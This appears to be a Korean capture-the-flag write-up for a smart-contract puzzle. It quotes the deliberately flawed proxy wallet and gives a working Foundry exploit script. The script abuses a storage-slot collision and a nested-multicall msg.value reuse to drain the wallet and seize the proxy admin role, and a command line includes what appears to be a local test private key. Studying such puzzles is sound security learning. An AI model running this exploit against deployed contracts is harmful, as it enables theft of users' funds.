# 지문


요즘 DeFi 작업을 위해 가스비를 내는 건 사실상 불가능하다.

몇몇 친구들이 여러 트랜잭션을 한 번에 묶어서(batch) 실행하면 비용을 조금 줄일 수 있다는 것을 발견했고, 그래서 이를 수행하기 위한 스마트 컨트랙트를 개발했다.

이들은 혹시 코드에 버그가 있을 경우를 대비해 **업그레이드 가능**하도록 이 컨트랙트를 만들었으며, 또 외부 사람들이 사용하는 것을 막고 싶었다. 그래서 투표를 통해 시스템에 두 명에게 특별한 역할을 부여했다:

* **Admin**: 스마트 컨트랙트의 로직을 업데이트할 수 있는 권한 보유
* **Owner**: 컨트랙트를 사용할 수 있는 화이트리스트를 관리하는 권한 보유

컨트랙트는 배포되었고, 그룹 멤버들이 화이트리스트에 등록되었다. 모두가 악랄한 채굴자들에 맞선 성취를 기뻐했다.

하지만 그들은 몰랐다. 그들의 점심값이 위험에 처해 있었다는 것을…

---

이 레벨에서는 이 지갑을 탈취해서 **프록시의 admin이 되는 것**이 목표다.

도움이 될 만한 것들:

* `delegatecall`이 어떻게 동작하는지, 그리고 이를 수행할 때 `msg.sender`와 `msg.value`가 어떻게 동작하는지 이해하기
* 프록시 패턴과 이들이 스토리지 변수를 다루는 방식을 이해하기



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

# 풀이 

일단 첫번째로 PuzzleProxy의 slot 1(`pendingAdmin`), 그리고 PuzzleWallet의 slot 1(`owner`)이 충돌함.

그래서 `proposeNewAdmin` 함수 호출을 통해서 `pendingAdmin`을 설정한다는게 `owner`를 설정하게끔되고 그뒤에는 `owner`만 호출할 수 있는 `addToWhitelist` 함수를 호출할 수 있어서 그것으로 내 contract를 whitelist에 추가한다음에 그뒤로 계속 플레이하면됨.

이제 보면 PuzzleProxy의 slot 2(`admin`), 그리고 PuzzleWallet의 slot 2(`maxBalance`)가 충돌함.

일단 `maxBalance`를 설정할 수 있는 조건을 보면 contract 내의 native token balance가 0인 상태에서 `setMaxBalance`를 호출하면됨




문제 해결에 필요한 이슈의 실제 케이스는 다음 링크에 소개되어있음. (https://blog.trailofbits.com/2021/12/16/detecting-miso-and-opyns-msg-value-reuse-vulnerability-with-slither/)


batch call이 delegationcall을 이용해서 동일 contract 내에 여러개의 함수를 한 call안에 실행시키게끔 구현해놓은게 많음
여기서 중요한건 delegatecall batch call에서 `public payable` 또는 `external payable`이 적용되버리면 100원을 한번 입금했는데 10번 입금된 효과를 노릴 수도 있음.

그러니까 delegatecall로 payable 함수를 여러번 호출한다고 잔고 내의 native token이 여러번 징수되는게아니라 한번만 징수됨

위에 언급한 요소들을 감안해서 문제를 해결하면됨.


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external;
    function execute(address to, uint256 value, bytes calldata data) external;
    function multicall(bytes[] calldata data) external payable;
    function admin() external view returns (address);
}

contract Helper {
    bytes[] callInstance;
    bytes[] callInstance2;
    ITarget target_;

    function trigger(address target) public payable{
        target_ = ITarget(target);
        target_.proposeNewAdmin(address(this));
        target_.addToWhitelist(address(this));

        callInstance.push(abi.encodeWithSignature("deposit()"));
        callInstance2.push(abi.encodeWithSignature("deposit()"));
        callInstance.push(abi.encodeWithSignature("multicall(bytes[])", callInstance2));
        target_.multicall{value:1000000000000000}(callInstance);

        target_.execute(address(this), 2000000000000000, "");
        target_.setMaxBalance(uint256(uint160(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC))); // 내 지갑 주소
    }
    receive() external payable {

    }

}
contract SolveScript is Script {
    address public target = 0xb6410CE04122bDAe70D8F2f509e9814B51766618;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        console.log("admin : %s", ITarget(target).admin());
        helper.trigger{value:1000000000000000}(target);
        console.log("admin : %s", ITarget(target).admin());
        vm.stopBroadcast();
    }
}

```